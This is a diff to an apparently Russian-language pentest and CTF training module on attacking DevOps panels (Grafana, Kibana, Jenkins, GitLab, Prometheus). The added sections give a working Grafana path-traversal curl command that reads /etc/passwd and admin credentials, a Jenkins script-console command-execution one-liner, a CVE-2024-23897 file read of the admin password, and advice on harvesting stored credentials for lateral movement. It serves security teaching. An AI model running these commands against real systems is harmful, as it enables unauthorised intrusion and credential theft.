@@ -11,7 +11,7 @@ useful_for:
   - "CTF Web категория"
   - "Bug bounty"
   - "Пентест веб-приложений"
-estimated_minutes: 50
+estimated_minutes: 75
 summary: "DevOps-панели (мониторинг, логи, CI/CD, SCM) как цель: почему они дают креды и RCE, их общие черты и методика атаки по версиям."
 ---
 
@@ -113,6 +113,70 @@ DevOps-панели — рабочий инструмент инженеров; 
 ## Шаг 10: как расставить приоритеты
 
 Приоритет выше, если панель: (1) доступна из интернета; (2) имеет уязвимость pre-auth; (3) хранит креды к продовым системам. Ниже — если панель внутренняя, пропатчена и не содержит секретов. Не трать время на бесперспективную панель, когда рядом открыт Jenkins с Script Console.
+
+## Практика: как отличить Grafana от Kibana и Jenkins
+
+DevOps-панели легко перепутать, а от продукта зависит вектор. Быстрая проверка по уникальным признакам:
+
+```
+$ for p in /login /app/kibana /api/health /login?next=%2F ; do
+    echo "== $p"; curl -s -o /dev/null -w '%{http_code} %{redirect_url}\n' "https://dev.target.example$p"
+  done
+== /login
+200 https://dev.target.example/login
+== /app/kibana
+404 
+== /api/health
+200 
+```
+
+Grafana отдаёт `/login` и `/api/health` с JSON `{"database":"ok"}`. Kibana отвечает на `/app/kibana` и `/api/status`. Jenkins живёт на `/login` с заголовком `X-Jenkins` и `X-Jenkins-Session`. Различать их нужно до атаки: у Grafana — path traversal, у Kibana — прототип-поллюция, у Jenkins — script console.
+
+## Практика: Grafana LFI — читаем, но не пишем
+
+CVE-2021-43798 — path traversal в плагинах Grafana. Работает так: `/public/plugins/<plugin>/../../../../etc/passwd`. Плагин по умолчанию — `alertlist`.
+
+```
+$ curl -s --path-as-is \
+  "https://dev.target.example/public/plugins/alertlist/../../../../../../etc/passwd" | head -3
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+```
+
+`--path-as-is` обязателен: без него curl сам нормализует `..` и запрос не сработает. Дальше читаем `grafana.ini` (`/etc/grafana/grafana.ini`) — там `admin_user`, `admin_password`, а иногда `secret_key`. Это уже доступ к панели, а через datasources — к Prometheus/InfluxDB/Elasticsearch.
+
+## Практика: Kibana — от прототип-поллюции к RCE
+
+CVE-2019-7609 — прототип-поллюция в Kibana Timelion, приводящая к RCE через Node.js. Проверка: отправить в Timelion-выражение payload, который загрязняет `Object.prototype` и вызывает `child_process`. Опасность в том, что Kibana часто стоит с `xpack.security.enabled: false` — без аутентификации вообще. Поэтому первый запрос — просто `curl -s https://kibana.target.example/api/status | grep -i 'security'`.
+
+## Практика: Jenkins script console
+
+Script Console (`/script`) — это Groovy-интерпретатор на сервере. Если доступен — RCE в одну строку:
+
+```
+def p = ['bash','-c','id'].execute(); p.waitFor(); println p.text
+```
+
+Но чаще он за аутентификацией. Тогда идём через CVE-2024-23897 — чтение файлов через CLI-парсер Jenkins. Парсим `@`-синтаксис аргументов, чтобы вытащить `/var/jenkins_home/secrets/initialAdminPassword` или `/etc/passwd`. Это уже даёт путь к админу, а значит и к console.
+
+## Таблица: DevOps-панели и их точки входа
+
+| Панель | Порт по умолч. | Признак | Классический вектор |
+|---|---|---|---|
+| Grafana | 3000 | `/api/health`, `grafana_session` | CVE-2021-43798 LFI |
+| Kibana | 5601 | `/app/kibana`, `kbn-xsrf` | CVE-2019-7609 proto→RCE |
+| Jenkins | 8080 | `X-Jenkins`, `/script` | script console, CVE-2024-23897 |
+| GitLab | 80/443 | `/users/sign_in`, `_gitlab_session` | CVE-2021-22205 ExifTool RCE |
+| Prometheus | 9090 | `/graph`, `/api/v1/query` | открытые метрики |
+| ArgoCD | 443 | `/api/version`, `argocd` | CVE-2022-... auth bypass |
+
+## Как использовать панель для движения дальше
+
+Панель — это узел с высокой связностью. Grafana видит все datasources; Jenkins видит все креды и агентов сборки; GitLab видит код и runner-токены; Kibana видит логи с токенами. Поэтому после входа в панель первым делом ищи **креды других систем**: в Grafana — раздел Datasources (`/api/datasources`), в Jenkins — `/credentials/`, в GitLab — CI/CD-переменные проекта. Часто именно так находят пароль к базе, к облаку или к SSH-хосту, и панель становится мостом вглубь сети.
+
+## Практика: Prometheus и открытые метрики как разведка
+
+Prometheus на `:9090` без аутентификации — это не только графики. Через `/api/v1/targets` виден **полный список целей** мониторинга: имена хостов, порты, пути. Через `/api/v1/query?query=...` можно вытащить метрики с метками, где иногда встречаются версии, имена сервисов и даже пароли (в метках `label`). Начни с `curl -s http://prometheus.target.example:9090/api/v1/targets | head -c 500` — это мгновенно даёт карту инфраструктуры. Затем `/api/v1/label/__name__/values` перечисляет все метрики. Экспортёр Node (`:9100`) через `/metrics` отдаёт список процессов и смонтированных ФС, а `/debug/pprof/` на Go-сервисах может дать heap-дамп. Так DevOps-панель становится картой сети, по которой строится вся дальнейшая атака.
 
 ## Квиз
 
